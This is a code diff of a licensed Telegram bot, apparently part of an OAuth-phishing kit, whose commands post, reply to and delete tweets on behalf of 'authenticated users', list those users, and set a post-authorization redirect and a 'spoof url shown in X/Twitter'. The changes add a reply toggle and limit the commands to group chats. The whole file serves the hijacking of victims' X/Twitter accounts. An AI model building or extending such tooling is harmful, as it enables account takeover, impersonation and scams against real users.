@@ -125,7 +125,7 @@ async def start(update: Update, context: CallbackContext) -> None:
 async def help(update: Update, context: CallbackContext) -> None:
     chat_id = get_chat_id(update)
     
-    text = "❔ *List of Commands*\n\n *•* 🐦 */post\\_tweet* \\<username\\> \\<message\\> \\- Posts a tweet on behalf of the user\\.\n *•* 💬 */post\\_reply* \\<username\\> \\<tweet\\_id\\> \\<message\\> \\- Posts a reply to a tweet on behalf of the user\\.\n *•* ❌ */delete\\_tweet* \\<username\\> \\<tweet\\_id\\> \\- Deletes a tweet on behalf of the user\\.\n *•* 👥 */display\\_users* \\- Shows the list of authenticated users\\.\n *•* 🔗 */display\\_endpoint* \\- Displays the group's endpoint\\.\n *•* 🔄 */set\\_redirect* \\<url\\> \\- Sets the redirect upon authorization\\.\n *•* 🥷 */set\\_spoof* \\<url\\> \\- Sets the spoof url shown in Twitter\\.\n *•* ❔ */help* \\- Displays the list of commands\\."
+    text = "❔ *List of Commands*\n\n *•* 🐦 */post\\_tweet* \\<username\\> \\<message\\> \\- Posts a tweet on behalf of the user\\.\n *•* 💬 */post\\_reply* \\<username\\> \\<tweet\\_id\\> \\<message\\> \\- Posts a reply to a tweet on behalf of the user\\.\n *•* ❌ */delete\\_tweet* \\<username\\> \\<tweet\\_id\\> \\- Deletes a tweet on behalf of the user\\.\n *•* 👥 */display\\_users* \\- Shows the list of authenticated users\\.\n *•* 🔗 */display\\_endpoint* \\- Displays the group's endpoint\\.\n *•* 🔄 */set\\_redirect* \\<url\\> \\- Sets the redirect upon authorization\\.\n *•* 🥷 */set\\_spoof* \\<url\\> \\- Sets the spoof url shown in X/Twitter\\.\n *•* ❔ */help* \\- Displays the list of commands\\."
     await context.bot.send_message(chat_id, text, parse_mode)
 
 
@@ -263,6 +263,32 @@ async def set_spoof(update: Update, context: CallbackContext) -> None:
         parse_mode = "MarkDown"
         await context.bot.send_message(chat_id, text, parse_mode)
 
+
+async def set_replies(update: Update, context: CallbackContext) -> None:
+    chat_id = get_chat_id(update)
+    
+    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
+        return
+    
+    if update.effective_chat.type == "private":
+        text = "❌ *This command can only be used in groups\\.*"
+        
+        await context.bot.send_message(chat_id, text, parse_mode) 
+        return
+        
+    group = groups.find_one({"group_id": chat_id})
+    if group:
+        group_data = {
+            "replies": not group["replies"]
+        }
+        groups.update_one(
+            {"group_id": chat_id},
+            {"$set": group_data}
+        )
+        
+        text = f"✅ *Replies for tweets from accounts are now set to {'mentioned\\-only\\.' if group['replies'] else 'enabled\\.'}*"
+        await context.bot.send_message(chat_id, text, parse_mode)
+
         
 async def display_endpoint(update: Update, context: CallbackContext) -> None:
     chat_id = get_chat_id(update)
@@ -328,6 +354,12 @@ async def post_tweet(update: Update, context: CallbackContext) -> None:
     if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
         return
         
+    if update.effective_chat.type == "private":
+        text = "❌ *This command can only be used in groups\\.*"
+        
+        await context.bot.send_message(chat_id, text, parse_mode) 
+        return
+            
     args = context.args
     if len(args) < 2:
         await update.message.reply_text(
@@ -367,6 +399,12 @@ async def post_reply(update: Update, context: CallbackContext) -> None:
     if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
         return
         
+    if update.effective_chat.type == "private":
+        text = "❌ *This command can only be used in groups\\.*"
+        
+        await context.bot.send_message(chat_id, text, parse_mode) 
+        return
+        
     args = context.args
     if len(args) < 3:
         await update.message.reply_text(
@@ -404,6 +442,12 @@ async def delete_tweet(update: Update, context: CallbackContext) -> None:
     chat_id = get_chat_id(update)
     
     if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
+        return
+        
+    if update.effective_chat.type == "private":
+        text = "❌ *This command can only be used in groups\\.*"
+        
+        await context.bot.send_message(chat_id, text, parse_mode) 
         return
         
     args = context.args
